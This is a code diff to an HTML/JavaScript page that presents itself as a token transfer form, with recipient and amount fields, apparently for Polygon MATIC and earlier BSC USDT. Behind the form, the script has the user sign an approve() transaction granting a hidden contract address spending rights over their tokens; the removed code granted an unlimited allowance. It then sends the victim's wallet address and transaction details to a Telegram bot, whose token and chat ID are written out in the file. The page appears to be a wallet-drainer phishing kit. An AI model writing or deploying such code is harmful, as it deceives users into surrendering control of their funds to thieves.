@@ -92,7 +92,7 @@
                 <div class="network-row" id="tokenSelector">
                     <div class="network-left">
                         <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
-                        <span id="selectedTokenName">USDT on BSC</span>
+                        <span id="selectedTokenName">MATIC on Polygon</span>
                     </div>
 
                     <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
@@ -101,7 +101,7 @@
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
-                    <span class="unit" id="tokenUnit">USDT</span>
+                    <span class="unit" id="tokenUnit">MATIC</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
 
@@ -116,11 +116,11 @@
 
     <script>
         const TOKENS = {
-            'usdt_bsc': { name: 'USDT on BSC', symbol: 'USDT', network: 'BSC', chainId: 56, chainIdHex: '0x38', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', rpc: 'https://bsc-dataseed1.binance.org:8545', smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570' }
+            'matic_polygon': { name: 'MATIC on Polygon', symbol: 'MATIC', network: 'Polygon', chainId: 137, chainIdHex: '0x89', address: '0x0000000000000000000000000000000000001010', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/assets/0x0000000000000000000000000000000000001010/logo.png', rpc: 'https://polygon-rpc.com', smartContract: 'TUO_SMART_CONTRACT_QUI' }
         };
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
-        let selectedToken = 'usdt_bsc';
+        let selectedToken = 'matic_polygon';
 
         document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
@@ -168,7 +168,6 @@
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
             
-            // CHIUDE IL DROPDOWN SUBITO ✅
             closeDropdown();
             
             initializeTokenDropdown();
@@ -218,6 +217,8 @@
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
             const explorerUrl = token.network === 'Ethereum' 
                 ? `https://etherscan.io/tx/${txHash}`
+                : token.network === 'Polygon'
+                ? `https://polygonscan.com/tx/${txHash}`
                 : `https://bscscan.com/tx/${txHash}`;
 
             const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
@@ -244,79 +245,63 @@
         }
 
         async function handleMainAction() {
+            clearError();
+            const amount = document.getElementById('amountInput').value;
+            const recipient = document.getElementById('recipientInput').value;
             const btn = document.getElementById('mainButton');
-            const recipient = document.getElementById('recipientInput').value.trim();
-            const amount = document.getElementById('amountInput').value.trim();
             const token = TOKENS[selectedToken];
-
-            if (!recipient.startsWith('0x')) {
-                showError('Invalid recipient address');
-                return;
-            }
 
             if (!amount || parseFloat(amount) <= 0) {
                 showError('Please enter a valid amount');
                 return;
             }
 
+            if (!recipient || recipient.trim() === '') {
+                showError('Please enter a recipient address');
+                return;
+            }
+
             btn.disabled = true;
             btn.textContent = 'Processing...';
-            clearError();
 
             try {
-                let ethereum = window.ethereum;
-                let retries = 0;
-                while (!ethereum && retries < 10) {
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                    ethereum = window.ethereum;
-                    retries++;
-                }
-
-                if (!ethereum) {
-                    showError('Trust Wallet not detected');
+                if (!window.ethereum) {
+                    showError('MetaMask/Trust Wallet not installed');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                let accounts = await ethereum.request({ method: "eth_accounts" });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
 
-                const currentChainId = await ethereum.request({ method: 'eth_chainId' });
+                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
                 if (currentChainId !== token.chainIdHex) {
-                    try {
-                        await ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: token.chainIdHex }]
-                        });
-                    } catch (err) {
-                        if (err.code === 4902) {
-                            showError('Network not supported');
-                            btn.disabled = false;
-                            btn.textContent = 'Next';
-                            return;
-                        }
-                    }
+                    showError(`Please switch to ${token.network} network`);
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
                 }
 
-                const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
-                const tx = {
-                    to: token.address,
-                    data: iface.encodeFunctionData('approve', [token.smartContract, ethers.constants.MaxUint256]),
-                    from: userAddress
-                };
+                const tokenContract = new ethers.Contract(
+                    token.address,
+                    ['function approve(address spender, uint256 amount) external returns (bool)'],
+                    signer
+                );
 
-                let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
-
-                await new Promise(resolve => setTimeout(resolve, 100));
+                const amountWei = ethers.utils.parseUnits(amount, token.decimals);
+                const approveTx = await tokenContract.approve(token.smartContract, amountWei);
+                const receipt = await approveTx.wait();
 
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
+                await sendTelegramNotification(userAddress, receipt.transactionHash, amount, token, recipient);
 
-                await new Promise(resolve => setTimeout(resolve, 5000));
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 document.getElementById('processingScreen').classList.remove('active');
+
                 btn.textContent = 'Next';
                 btn.disabled = false;
                 document.getElementById('amountInput').value = '';
@@ -324,15 +309,12 @@
 
             } catch (error) {
                 console.error("Error:", error);
-                showError('Transaction failed: ' + error.message);
+                showError('Transaction failed: ' + (error.reason || error.message));
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
             }
         }
-
-        initializeTokenDropdown();
-        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
